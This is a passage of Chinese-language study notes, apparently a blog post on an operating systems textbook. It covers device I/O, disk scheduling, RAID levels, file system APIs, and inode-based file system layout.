<h4 id="方法二：内存映射-I-O"><a href="#方法二：内存映射-I-O" class="headerlink" title="方法二：内存映射 I&#x2F;O"></a>方法二：内存映射 I&#x2F;O</h4><p>操作系统不直接与设备的寄存器打交道，而是将设备的寄存器映射到虚拟内存地址空间中，用某个虚拟地址代表它；当需要向设备写入数据时，操作系统调用的指令跟平时写入虚拟内存时一样；CPU 在收到该指令后，通过映射表找到实际的设备寄存器地址，然后向设备的寄存器写入数据（内存映射的一个好处是 CPU 不需要单独设计额外的指令集，仅使用原有的指令集就可以了）；</p>
<blockquote>
<p>问：映射关系记录在哪里？</p>
<p>答：莫非 CPU 的 TLB 里面有专门的地方用来记录这个东西？</p>
</blockquote>
<h3 id="纳入操作系统：设备驱动程序"><a href="#纳入操作系统：设备驱动程序" class="headerlink" title="纳入操作系统：设备驱动程序"></a>纳入操作系统：设备驱动程序</h3><p>操作系统由很多个子系统构成，每个子系统都可能与设备打交道，显然让每个子系统都直接去调用设备的交互接口并不是一个好主意，因为当某个设备发生变动时，导致所有子系统都需要做出调整；更好的办法，是让部分模块专门负责与某个特定设备进行交互，由它负责具体的交互实现细节；而系统中的其他模块，只要直接调用该模块提供的接口就好了；（这其实就是简单又强大的抽象分层技术）；</p>
<blockquote>
<p>某个具体实现与特定设备进行交互的模块，即是常说的设备驱动程序；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201109080302.png"></p>
<blockquote>
<p>这种架构也有一点缺点，即如果某个比较新款的设备提供了一些市面上不常见的特殊功能，由于通用块接口的开发或者某个系统软件（如文件系统）的开发还没有跟上，暂未实现调用该特殊功能的接口给应用程序，将导致应用程序实际并无法使用到设备提供的最新功能；</p>
<p>此时貌似需要操作系统尽快推出补丁了？</p>
</blockquote>
<h3 id="IDE-磁盘驱动程序示例"><a href="#IDE-磁盘驱动程序示例" class="headerlink" title="IDE 磁盘驱动程序示例"></a>IDE 磁盘驱动程序示例</h3><p>IDE 硬盘包括以下寄存器：</p>
<ul>
<li>控制寄存器：1个；</li>
<li>命令寄存器：8个；</li>
<li>状态寄存器：1个；</li>
<li>错误寄存器：1个；</li>
</ul>
<p>驱动程序与设备的交互过程大概如下：</p>
<ul>
<li>等待设备就结绪：通过查看设备的状态寄存器获得是否就绪的信息；</li>
<li>写入命令参数：向设备的命令寄存器写入参数：写入的内容包括扇区数、逻辑块地址、磁盘编号（因为同一条 IDE 线支持挂载两个硬盘）；</li>
<li>写入命令：向设备的命令寄存器写入命令，以便配合上一步的参数，让磁盘实现具体的操作；</li>
<li>数据传送：等待，直到设备的状态寄存器的值再次更新为 READY 和 DRQ 时，向设备的数据寄存器写入数据；</li>
<li>中断处理：正常情况下，每个扇区的数据传送结束后，都会触发一次中断，以便调用相应的中断处理程序；</li>
<li>错误处理：每次操作后，都检查一下错误寄存器，就触发错误处理程序；</li>
</ul>
<h2 id="28-磁盘驱动器"><a href="#28-磁盘驱动器" class="headerlink" title="28.磁盘驱动器"></a>28.磁盘驱动器</h2><blockquote>
<p>问题：现代磁盘驱动器是如何存储数据的？接口是什么？数据是如何安排和访问的？磁盘调度如何提高性能？</p>
</blockquote>
<h3 id="基本单位"><a href="#基本单位" class="headerlink" title="基本单位"></a>基本单位</h3><p>磁盘驱动器的最小单位是扇区，每个扇区默认为 512 字节；每一次操作都是什么一个扇区的原子性操作，要么全部写入，要么全部没有写入；整个磁盘被划分为 n 个扇区，相当于一个由 n 个元素组成的数组；地址空间（即地址编号范围）由 0 到 n-1 组成；</p>
<blockquote>
<p>虽然有些文件系统支持以 4KB 为单位的读取和写入，但实际上在底层仍然是以 512 字节为单位的；这意味着 4KB 的操作并非原子性的，如果在读写过程中发生断电，有可能导致 4KB 的数据只写了一部分；</p>
</blockquote>
<h3 id="基本几何形状"><a href="#基本几何形状" class="headerlink" title="基本几何形状"></a>基本几何形状</h3><p>由大到小：盘片-&gt;表面-&gt;磁道-&gt;扇区；表面上的磁道很多，几百个磁道加起来也只有一根头发的粗细，因此整个表面拥有成千上万的磁道；由于越外围的磁道，周长越大，因此如何分配跟内围的磁道相同的扇区数的话，显然会造成极大的浪费；因此，一般将表面分成多个区域，相同区域内的磁道，虽然周长不同，但扇区数相同；不同区域的磁盘，扇区数不同，以最大化利用磁盘表面的空间进行数据存储；</p>
<h3 id="缓存机制"><a href="#缓存机制" class="headerlink" title="缓存机制"></a>缓存机制</h3><p>寻道时间和旋转延迟是磁盘 I&#x2F;O 操作中时间成本最高的两个操作；为了降低每次读写数据的时间成本，磁盘通常会引入缓存机制，即并不是精准读取指定扇区的数据，而是将整个磁道多个扇区的数据一起读取出来，放到缓存中；由于局部性原理，接下来这些数据有很大概率被访问，从而避免了第二次的寻道和旋转时间；</p>
<h3 id="I-O-时间"><a href="#I-O-时间" class="headerlink" title="I&#x2F;O 时间"></a>I&#x2F;O 时间</h3><p>对于随机访问和顺序访问两种场景来说，磁盘性能差距巨大，可能有 200-300 倍左右的差距；随机访问可能才 0.5M&#x2F;s，而顺序访问可以达到 100M&#x2F;s；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201110075912.png"></p>
<h3 id="调度策略"><a href="#调度策略" class="headerlink" title="调度策略"></a>调度策略</h3><p>相对于任务调度，磁盘调度有一个好处是可以大概估算完成操作所需要的时间，假设操作系统收到多个磁盘调度的请求，由于可以大致计算每个调度的用时，因此可以使用一些调度策略来提高调度性能；</p>
<h4 id="最短寻道时间优先"><a href="#最短寻道时间优先" class="headerlink" title="最短寻道时间优先"></a>最短寻道时间优先</h4><p>操作系统可以根据请求的扇区地址，计算出各个请求与当前位置的远近顺序，优先服务最近的请求，延后服务最远的请求；这样可以避免浪费时间在寻道上面；缺点：有可能导致最远磁道的请求饿死；</p>
<h4 id="电梯扫楼策略"><a href="#电梯扫楼策略" class="headerlink" title="电梯扫楼策略"></a>电梯扫楼策略</h4><p>这个策略很像到写字楼发传单的场景，推广人员乘坐电梯，将底层到顶层，将每一层楼扫一遍；扫完之后，如果还有没有新进来的待处理请求，再从最顶层到最底层扫一遍，以此类推；</p>
<p>这个方法的好处是可以避免某些请求饿死，但它仍然不是最优的算法，因为它没有考虑旋转延迟的成本；</p>
<h4 id="最短定位时间优先"><a href="#最短定位时间优先" class="headerlink" title="最短定位时间优先"></a>最短定位时间优先</h4><p>这个策略的优点是将旋转延迟的成本也考虑进来了，以最短的寻道时间+旋转时间之和作为调度的顺序；但是理想很丰满，现实很骨感；因为磁盘的规格型号很多，操作系统并不知道所要寻找的扇区在磁盘表面的位置，因此也无法估算出旋转时间；所以，这个策略并不适合操作系统，但适合在磁盘内部来实现；因为每个磁盘生产商在生产磁盘的时候，各项参数是已知的；</p>
<h3 id="双重调度"><a href="#双重调度" class="headerlink" title="双重调度"></a>双重调度</h3><p>在早期，磁盘的调度是由操作系统来完成的，但为了取得更好的性能，现在改成了由操作系统和磁盘二者共同完成；操作系统挑选一批自认为不错的请求发给磁盘（例如会合并一些扇区相近的请求），磁盘使用内置的调度程序，以最快的策略处理请求并返回结果；</p>
<p>一般来说，操作系统并不是一收到应用程序的 I&#x2F;O 请求，就马上将它发给磁盘，而是会稍微等一小段时间，让更多的请求进来后，再开始调度；</p>
<h2 id="29-廉价的冗余磁盘"><a href="#29-廉价的冗余磁盘" class="headerlink" title="29.廉价的冗余磁盘"></a>29.廉价的冗余磁盘</h2><blockquote>
<p>问：数据除了能够更快的访问外，如何解决可靠性问题，避免意外丢失？</p>
</blockquote>
<p>RAID 的全称竟然是 Redundant Array of Inexpensive Disk，翻译一下：廉价的冗余磁盘组；</p>
<p>RAID 的思想很像单独组建一套由多个磁盘、内存、1个或多个处理器组成的计算机系统，这套系统的专职工作即是完成数据的存储和管理；它有如下的优点：</p>
<ul>
<li>增加了可靠性，即使有一个磁盘不工作了，也不会导致数据的丢失；</li>
<li>提高了性能，原来的 I&#x2F;O 请求需要排队逐个处理，现在可以分散给多个磁盘并发处理；</li>
</ul>
<h3 id="接口和-RAID-内部"><a href="#接口和-RAID-内部" class="headerlink" title="接口和 RAID 内部"></a>接口和 RAID 内部</h3><p>RAID 对外暴露的接口跟普通的磁盘完全一样，这就使得它的部署和使用变得没有成本，不需要改动操作系统或应用程序，即可以像使用普通磁盘那样使用 RAID 磁盘；</p>
<p>但实际上 RAID 内部是相当复杂的，它接近等同一个独立的计算机系统，有自己的内存、处理器和磁盘；当它接收到外部的逻辑请求后，对该请求进行换算，映射成物理请求，然后发给磁盘进行处理；</p>
<h3 id="故障模型"><a href="#故障模型" class="headerlink" title="故障模型"></a>故障模型</h3><p>RAID 本质上主要还是为了提高可靠性，因此需要对现实世界中可能发生的故障类型进行建模，常见的有如下几种类型的故障：</p>
<ul>
<li>故障-停止：磁盘出现故障，然后不工作了；</li>
<li>磁盘损坏</li>
<li>扇区错误</li>
</ul>
<h3 id="如何评估-RAID"><a href="#如何评估-RAID" class="headerlink" title="如何评估 RAID"></a>如何评估 RAID</h3><p>RAID 有多种设计实现方案，分别对应满足不同的业务需求，有些侧重可靠性，有些侧重性能，因此一般有三个评估的维度：</p>
<ul>
<li>性能；</li>
<li>可靠性</li>
<li>容量；</li>
</ul>
<h3 id="RAID-0级：条带化"><a href="#RAID-0级：条带化" class="headerlink" title="RAID 0级：条带化"></a>RAID 0级：条带化</h3><p>条带化的思想是将扇区按顺序轮流放在每个磁盘上，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201110085625.png"></p>
<h4 id="块的大小"><a href="#块的大小" class="headerlink" title="块的大小"></a>块的大小</h4><p>以多大的块作为最小的单位，轮流存储在每个磁盘上，是一个设计时需要权衡的问题；块越小，则文件访问的并行性越好；但是同时会增加寻道和旋转成本；因此并不存在最佳方案，完成取决于主要应用在何种业务场景；一般来说，大多数使用 64KB 的块大小；</p>
<ul>
<li>优点：性能好、容量大；</li>
<li>缺点：可靠性差，因为任一磁盘故障都将导致数据丢失；</li>
</ul>
<h3 id="RAID-1级：镜像"><a href="#RAID-1级：镜像" class="headerlink" title="RAID 1级：镜像"></a>RAID 1级：镜像</h3><p>镜像的原理是将同一份数据在两个或多个磁盘上各存储一个副本；它的好处是增加了可靠性，即使有一个磁盘发生了故障，也不会导致数据丢失，由于可以并发的读写，因此性能上也没有损失；缺点是损失了容量；</p>
<p>镜像在写入数据的时候，需要同时更新两个或多个磁盘，如果此时其中一个磁盘发生断电，没有写入成功，最后将导致各个磁盘存储的数据不一致；为了解决这个问题，RAID 1 引入了一个小小的非易失性的 RAM，用来预写日志；这样如果万一有某个操作被意外中断没有完成，仍然可以通过日志在后续弥补；</p>
<p>前面说性能没有损失有点错误，实际上性能在不同场景下有些差异：</p>
<ul>
<li>顺序读：N * S &#x2F; 2</li>
<li>顺序写：N * S &#x2F; 2</li>
<li>随机读：N * R</li>
<li>随机写：N * R &#x2F; 2</li>
</ul>
<blockquote>
<p>此处 N 表示磁盘的数量，S 表示顺序，2 表示副本数量，R 表示随机，单位为 M&#x2F;s</p>
</blockquote>
<h3 id="RAID-4级：通过奇偶校验节省空间"><a href="#RAID-4级：通过奇偶校验节省空间" class="headerlink" title="RAID 4级：通过奇偶校验节省空间"></a>RAID 4级：通过奇偶校验节省空间</h3><p>由于 RAID 1级非常浪费空间，RAID 4 级准备在这个维度上进行改进；它的思路是在普通磁盘上使用异或算法得到计算结果，并增加一个磁盘用来存储该异或结果；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201111082438.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201111082503.png"></p>
<p>这样当某个磁盘出错时，可以跟剩余磁盘的位+校验磁盘位，再次异或，得到丢失的位的值；</p>
<blockquote>
<p> 这个算法很机智，不过 RAID4 最大只能允许一个磁盘出错，如果有2个或多个以上的磁盘出错，就恢复不了了；</p>
</blockquote>
<p>各个场景下的性能分析：</p>
<ul>
<li>顺序读：(N - 1) * S</li>
<li>顺序写：(N - 1) * S</li>
<li>随机读：(N - 1) * R</li>
<li>随机写：R &#x2F; 2，看起来确实很糟糕，因为只有一个校验磁盘，这意味着对任何普通磁盘的写入，都必须汇总到校验盘的读写上面，而它又需要先做一次读，再做一次写，才能完成一个逻辑写入，因此性能下降为单个磁盘的一半；</li>
</ul>
<h3 id="RAID-5-级：旋转奇偶校验"><a href="#RAID-5-级：旋转奇偶校验" class="headerlink" title="RAID 5 级：旋转奇偶校验"></a>RAID 5 级：旋转奇偶校验</h3><p>为了解决 RAID4 在随机小写入场景中性能糟糕的问题，引入了 RAID 5级，它的思路是不再将奇偶位单独存储在一个磁盘上，而是像普通数据一样，加入轮转的队列；根据顺序，依次存放在不同的磁盘上，例如 P0 在编号磁盘4，P1 在磁盘3，P2 在磁盘2，以此类推；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201111084223.png"></p>
<p>由于奇偶位引入了轮转存储的机制，因此随机小写入的性能会有所提升，达到约 N * R &#x2F; 4 MB&#x2F;s；</p>
<blockquote>
<p>此处有 4 倍的损失原来在于每个小写入，都将导致两次读取 + 两次写入；</p>
</blockquote>
<p>总结：不同的 RAID 方案用以实现不同的目标</p>
<ul>
<li>性能+容量：条带化 RAID0</li>
<li>性能+可靠性：镜像 RAID1</li>
<li>容量+可靠性：RAID5，牺牲一点点随机写入场景下的性能；</li>
</ul>
<h2 id="30-插叙：文件和目录"><a href="#30-插叙：文件和目录" class="headerlink" title="30.插叙：文件和目录"></a>30.插叙：文件和目录</h2><blockquote>
<p>问：操作系统应该如何管理文件和存储设备？需要给应用程序提供哪些API？实现环节有哪些注意事项？</p>
</blockquote>
<h3 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3><p>文件和目录是操作系统提供给用户关于管理存储数据的一种抽象；文件和目录都有一个自己的编号（inode号），同时还有一个方便用户阅读识别的名称（名称通常可以由用户任意指定，只要不包含一些限制符号）；目录可以用来组织文件的存储结构；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201112091459.png"></p>
<p>文件在本质上是一个字节的连续数组，每个字节都可以被单独的读取和写入；操作系统实际上只在磁盘上存储或读取该字节数组，它并不关心里面的内容是什么，内容的解析交由应用程序自己来处理；</p>
<h3 id="文件系统接口"><a href="#文件系统接口" class="headerlink" title="文件系统接口"></a>文件系统接口</h3><p>操作系统提供了一些接口（即系统调用），让应用程序能够进行调用以完成对文件的操作；</p>
<h4 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h4><p>应用程序通过调用 open 接口实现文件的创建，同时传入一些参数，来指定所创建文件的相关要求；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&#x27;foo&#x27;</span>, O_CREAT | O_WRONLY | O_TRUNC);</span><br><span class="line"><span class="comment">// 其中参数 O_CREAT 表示创建新文件，O_WRONLY 表示仅写入，O_TRUNC 表示如果有同名文件，删除其中的内容；</span></span><br><span class="line"><span class="comment">// 返回值 fd 是一个文件描述符，它相当于一个指向新创建文件的指针，通过它可以实现后续对文件的写入或读取操作；</span></span><br><span class="line"><span class="comment">// fd 是每个进程私有的；不同进程的不同 fd，有可能实际上背后指向的是同一个文件</span></span><br></pre></td></tr></table></figure>

<h4 id="读写文件：从头开始"><a href="#读写文件：从头开始" class="headerlink" title="读写文件：从头开始"></a>读写文件：从头开始</h4><p>基本过程：</p>
<ul>
<li>open 某个文件，得到文件描述符；</li>
<li>read 该文件描述符，并指定缓冲区大小；</li>
<li>write 将缓冲区内容写到目标位置（另一个文件描述符），例如屏幕（标准输出，它的文件描述符一般是 1）；</li>
<li>再次循环 read 和 write，直到文件中没有剩下内容（返回 0）；</li>
<li>close 文件；</li>
</ul>
<h4 id="读写文件：从中间开始"><a href="#读写文件：从中间开始" class="headerlink" title="读写文件：从中间开始"></a>读写文件：从中间开始</h4><p>lseek 系统调用允许应用程序从文件的中间某个指定位置开始读写操作，并一定非得从头开始；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off_t</span> <span class="title function_">lseek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> off_set, <span class="type">int</span> whence)</span>;</span><br><span class="line"><span class="comment">// off_set 表示偏移量, whence 表示偏移的方式，分别有如下几种情况：</span></span><br><span class="line"><span class="comment">// SEEK_SET：从头部开始，偏移 off_set 字节；</span></span><br><span class="line"><span class="comment">// SEEK_CUR：当前位置，偏移 off_set 字节；</span></span><br><span class="line"><span class="comment">// SEEK_END：从尾部开始，偏移 off_set 字节；</span></span><br></pre></td></tr></table></figure>

<h4 id="用-fsync-立即写入"><a href="#用-fsync-立即写入" class="headerlink" title="用 fsync() 立即写入"></a>用 fsync() 立即写入</h4><p>正常情况下，当应用程序调用 write 接口将数据写入文件后，操作系统并不是立即去执行这个动作，而是会将待写入数据暂时放在内存缓冲区中，每隔一段固定的时候，再统一向磁盘写一次；这样做的原因是为了提高磁盘的使用性能；</p>
<p>但是有些业务场景需要数据马上写入，例如数据库程序，因此，操作系统有额外提供 fsync() 接口，供应用程序调用；</p>
<h4 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h4><p>在 Linux 系统下，mv 接口提供了修改文件名的功能，它背后实质上是调用了 rename 接口；rename 接口有一个特性，即它的操作是原子性的，这样做的目的在于避免奇怪的中间状态，导致数据最后丢失，例如重命名的过程当中突然停电了，如果没有原子性，将导致文件即不是原来的名称，也不是新的名称，最后用户找不到了；</p>
<h4 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h4><p>除了文件内容外，通常还需要保存一些文件本身的相关信息，即所谓的文件元数据（或者叫头部信息），可以通过 stat 或 fstat 接口来查看；文件系统一般将这些信息存储在一个叫做 inode 的数据结构中，通常包含如下信息：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201113084417.png"></p>
<blockquote>
<p>好奇这里面怎么好像没有文件名称的信息？</p>
</blockquote>
<h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><p>表面上看，删除文件的接口是 rm，但通过 strace 跟踪可以发现它背后实质上调用的是  unlink；</p>
<h4 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h4><p>创建目录的接口熟悉的老朋友 mkdir；但目录并不能像文件一样被直接写入内容，它的格式在本质上是一堆文件系统元数据，需要使用间接更新的方式（在目录下面创建文件或子目录），来写入一些内容；</p>
<blockquote>
<p>这意味着在目录中创建文件或者子目录时，会同时修改目录节点的内容；</p>
</blockquote>
<p>目录刚创建的时候，其实含有两个内容条目，一个是引用自身的条目（点目录），一个是引用父级目录的条目（点点目录）；</p>
<h4 id="读取目录"><a href="#读取目录" class="headerlink" title="读取目录"></a>读取目录</h4><p>读取目录的接口是也一位老朋友：ls；由于目录本身包含的信息很少，只有文件或子目录名称，以及它们的 inode 编号；这意味着当我们使用 -l 选项让 ls 展示更多信息时，它背后实质上是调用了 stat 来获取每个条目的元数据来得到最终结果；</p>
<h4 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h4><p>接口为 rmdir，但是由于这个操作可能涉及将目录中的大量文件删除，是个危险动作；因此一般要求目录为空时，才允许执行（其实这个时候也不完全是空的，里面至少还有点和点点两个条目）；</p>
<h4 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h4><p>link 系统调用可以将一个新文件的名称，链接到某个旧文件名称上；背后的本质其实是让两个文件名称指向同一个 inode 编号；所以文件实质上仍然只有一个，只是名称有了两个；</p>
<p>当我们使用 open 创建一个文件时，操作系统实际上做了两个动作，一个是初始化一个 inode 结构，用来保存文件的元数据；另一个是在目录中增加一个新条目，将某个文件名称，链接到该 inode 结构；</p>
<p>在 inode 结构中有一个引用计数的字段，它用来记录当前有多少个文件名称条目引用到自己，当引用计数为零时，文件系统就会释放存储空间，从而真正的删除文件；</p>
<h4 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h4><p>符号链接也叫软链接，它出现的目的在于解硬链接存在的一些局限性，例如：</p>
<ul>
<li>不能创建目录的硬链接，因为可能会造成循环引用；</li>
<li>inode 编号仅在单个文件系统中是唯一的，在不同的文件系统中则不是；而一个操作系统下通常有多个文件系统（每个文件系统对应一个磁盘分区）；</li>
</ul>
<p>软链接表面上用起来好像跟硬链接一样，但背后有本质性的不同，它实现上并不是为新文件名增加一个引用条目，而是增加一个文件名的映射，即将新文件名映射到旧文件名；因此软链接的大小取于旧文件名有多长，旧文件名越长，则软链接的大小越大；</p>
<blockquote>
<p>软链接相当于给旧的文件名起一个新昵称！</p>
</blockquote>
<p>由于软链接实际上只是文件路径的映射，因此它并不会改变 inode 中的引用计数，这将导致出现悬空引用，即文件可能已经实质上删除了，但软链接仍然存在；这时如果对它进行访问，就会提示失败，找不到文件；</p>
<h4 id="创建并挂载文件系统"><a href="#创建并挂载文件系统" class="headerlink" title="创建并挂载文件系统"></a>创建并挂载文件系统</h4><blockquote>
<p>问：什么是文件系统？</p>
<p>答：看上去，文件系统好像是指管理文件的一种方式；文件系统有很多种类型，例如 ext3, ext4, tmpfs, sysfs, NTFS,FAT32, 等；不同类型的文件系统，背后存储和管理数据的方式不同，各有其优缺点；当我们给磁盘进行分区的时候，需要指定使用的格式，其实此时就是在指定文件系统类型；因此一个操作系统中，可能会有多个文件系统类型；但一个磁盘分区只使用一种文件系统类型；</p>
</blockquote>
<p>挂载文件系统的接口是 mount，每个文件系统都有自己的根目录，但是通过 mount，可以将各个文件系统统一集成到一个大的目录树项下，而不是多个独立的目录树，这让命名变得统一和方便了起来；</p>
<h2 id="31-文件系统实现"><a href="#31-文件系统实现" class="headerlink" title="31.文件系统实现"></a>31.文件系统实现</h2><p>CPU  和内存的虚拟化都需要配合硬件才能够实现，但文件和目录的虚拟化（即文件系统）不同，它是一个纯软件，并不需要硬件的配合；</p>
<blockquote>
<p>问：如何构建一个文件系统？磁盘上需要存储什么数据结构？它们需要记录什么？它们如何访问？</p>
</blockquote>
<h3 id="实现决策"><a href="#实现决策" class="headerlink" title="实现决策"></a>实现决策</h3><ul>
<li>文件系统采用何种数据结构；</li>
<li>文件如何被访问；</li>
</ul>
<h3 id="整体组织"><a href="#整体组织" class="headerlink" title="整体组织"></a>整体组织</h3><ul>
<li>先将磁盘按固定大小分成多个块（一般大小为 4KB，块跟扇区有点类似，但一个是在文件系统中虚拟的，一个是在物理磁盘中虚拟的），每个块拥有自己的地址；磁盘变成一个由 n 个块组成的数组；每个块作为最小的存储单位，因此磁盘此时最多可以存储 n 个文件；</li>
<li>由于每个文件都有一个 inode 数据结构用来保存文件的元信息；因此磁盘上还需要划分一个区域用来存储 inode 表；每个 inode 条目此处假设固定分配 256 字节的空间；因此一个 4KB 的块，可以存储 16 个 inode 条目；如果磁盘最多可以存放 n 个文件，意味需要 n &#x2F; 16 个块，用来存放 inode 表；</li>
<li>使用位图来标记其映射的 inode 块或者数据块是否空闲，还是已分配；</li>
<li>使用一个块（称为超级块）来存储关于当前磁盘上的文件系统的一些元信息，例如 inode 块数量、数据块数量、inode 表的起始位置、文件系统类型等；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201118082438.png"></p>
<blockquote>
<p>问：inode 表一开始就已经固定大小了吗？还是随着存储文件的增多，其大小是动态变化的？</p>
</blockquote>
<h3 id="文件组织：inode"><a href="#文件组织：inode" class="headerlink" title="文件组织：inode"></a>文件组织：inode</h3><p>对于文件系统来说，它是通过 inode 来标识和管理文件的，只要给它一个 inode 索引号，它就可以通过 inode 表找到该 inode 的相关信息，从而知道文件的具体信息；</p>
<blockquote>
<p>问：操作系统如何将路径转化成 inode 索引号？</p>
<p>答：从每级目录的数据块中遍历下一级目录或文件的 inode 编号</p>
</blockquote>
<p>只要给定一个 inode 编号，文件系统就可以计算出它在磁盘上的位置（通过起始地址+偏移量计算得到磁盘扇区编号）；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201118085855.png"></p>
<blockquote>
<p>由于磁盘的存储单位是扇区，一般为 512 字节，而此处块的大小为 4KB，二者不同，因此需要做一个换算；</p>
</blockquote>
<p>inode 对象中包含有关于文件的一些元数据，包括读写权限、用户名、组名、创建&#x2F;修改&#x2F;访问&#x2F;删除时间、硬链接计数、块数量、磁盘指针等信息；</p>
<h4 id="多级索引"><a href="#多级索引" class="headerlink" title="多级索引"></a>多级索引</h4><p>必须考虑的一个现实问题是文件在磁盘上的存储有可能是不连续的，即存储文件的块，有可能并不全部挨到一起；解决该问题有两种方法：</p>
<ul>
<li>间接指针：为每个存储块分配一个指针，如果文件很大，意味着指针将很多，inode 肯定是存放不下了，因此一般在 inode 中存放 12 个直接指针（直接指向数据块），加一个间接指针（指向另外一个专门用于存放指针的块，每个块可以放 1024 个指针，即可以指向 1024 个块，每个块 4KB 的存储空间，1024 * 4KB &#x3D; 4MB）；该方案的好处是存储位置非常灵活，没有限制，随便组合都行；缺点是对于特别大的文件，需要花很多块用来存放指针；例如 4GB 的文件意味着需要 1024 * 1024 个块，单这些块就需要占去 1MB 的空间（注意：此处已经引入了双重间接指针，即第一级和第二级指针指向的块，都是存储指针，而不是数据）；对于更大的文件，还可以考虑引入三重甚至四重间接指针；</li>
<li>范围指针：对于连续的块，用一个头部指针 + 一个长度范围来表示；优点：对于大文件，不再需要那么多的块，比较省空间；</li>
</ul>
<p>目前大多数文件系统都使用了多重间接指针索引的方式来存储文件，并且在 inode 中包含一定数量的直接指针；之所以这么指针，其原因在于大部分的文件都是一些小文件，因此 12 个左右的直接指针一般就够用了，只有少数大文件，才会用到间接指针；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201118092020.png"></p>
<blockquote>
<p>除了间接指针和范围指针外，还有另外一种存储文件的方式是使用链表，将下一个数据块的地址，存放在当前块的末尾；不过这种设计在应对文件内容的随机访问场景时，力有不逮，性能很差，因为需要完全扫描完整个块，才能得到下一个块的地址；</p>
</blockquote>
<h3 id="目录组织"><a href="#目录组织" class="headerlink" title="目录组织"></a>目录组织</h3><p>目录的内容是由元组组成的列表，每个元组中包含关于目录中的文件或子目录的基本信息，如 inode 号、元组的长度、文件名称的长度、文件名称；</p>
<p>当目录中的文件很多时，列表将会很长，因此目录也需要存储在数据块中，并且在 inode 表同样会有一条 inode 记录指向该数据块；因此，目录在本质上其实就是一个特殊类型的文件而已；它的类型信息会标记在 inode 记录中；</p>
<p>由于目录的元组列表在数据块中是连续性存储的，当目录中的某个文件被删除时，其对应的元组将被标记为删除（例如将 inode 号标记为 0）；但是其占用的空间仍然存在，只是该空间现在变成可用的了；如果后续有新的文件写入该目录，就可以利用该空间，重新写一条关于新文件的元组记录；</p>
<blockquote>
<p>这么说来，目录中的内容条目并不是按顺序存储的，而是无序的；</p>
</blockquote>
<p>由于目录的元组以列表方式存储，这意味着它不能快速定位到某个文件对应的元组记录在第几个，需要从头开始扫描；当目录中的文件少的时候还好，如果文件非常多，则会有一点时间成本；</p>
<blockquote>
<p>也有其他一些文件系统如 XFS，不是采用元组列表的形式来存储信息，而是采用 B 树的方式，这使得其扫描速度要快得多；</p>
</blockquote>
<h3 id="空闲空间管理"><a href="#空闲空间管理" class="headerlink" title="空闲空间管理"></a>空闲空间管理</h3><p>管理空闲空间的动作是必须的，因此这样当有新文件需要写入时，才知道将它存放到哪些空闲的数据块上；管理空闲空间的方式有很多种，例如位图、空闲链表（跟内存有点像）、B 树；不同的方式在时间和空间上面各有其优缺点；</p>
<p>为了让数据尽量连续存储，有些文件系统，如 ext2\ext3，在为新文件寻找空闲数据块时，会尽量一次寻找多个（例如 8 个）的连续空闲块，这样有助于后续提高文件的读定性能；</p>
<blockquote>
<p>一个块有 4KB，8 个空闲块有 32 KB，一个扇区有 512B，因此 8 个空闲块约等于 64 个扇区；那么问题来了：磁盘在读取扇区数据时，一次性读入多少个扇区到缓存中？</p>
</blockquote>
<h3 id="访问路径：读取和写入"><a href="#访问路径：读取和写入" class="headerlink" title="访问路径：读取和写入"></a>访问路径：读取和写入</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201118082438.png"></p>
<h4 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h4><p>当访问某个路径下的文件时，例如 open(“&#x2F;foo&#x2F;bar”)，实际发生的动作如下：</p>
<ul>
<li>读取根目录的 inode 内容（在 UNIX 系统中，根目录的 inode 编号固定为 2，因此可以很快根据偏移计算出其磁盘地址）；</li>
<li>从根目录的 inode 对象中，得到其指向的数据块地址；（该数据块保存着根目录下的文件或子目录的元组列表）；</li>
<li>将根目录的数据块内容读取到内存中，遍历它，找到 foo 的 inode 编号，计算出 foo 的 inode 磁盘地址；</li>
<li>从 foo 的 inode 对象中，得到其指向的数据块地址；</li>
<li>将 foo 目录数据块内容读取到内存中，遍历它，找到 bar 的 inode 编号，计算出 bar 的 inode 磁盘地址；</li>
<li>读取 bar 的 inode 对象内容到内容中，检查读写权是否无误；</li>
<li>若无误，返回一个文件描述符，指向该内存地址，完成 open 的调用；</li>
</ul>
<p>当文件打开后，调用 read() 时，实际发生的动作如下：</p>
<ul>
<li>从 inode 对象中，获取指向的数据块地址；默认从编号为 0 的数据块开始读取（除非调用过 lseek 更改了偏移量）；</li>
<li>更新 inode 的最后访问时间字段为当前时间；</li>
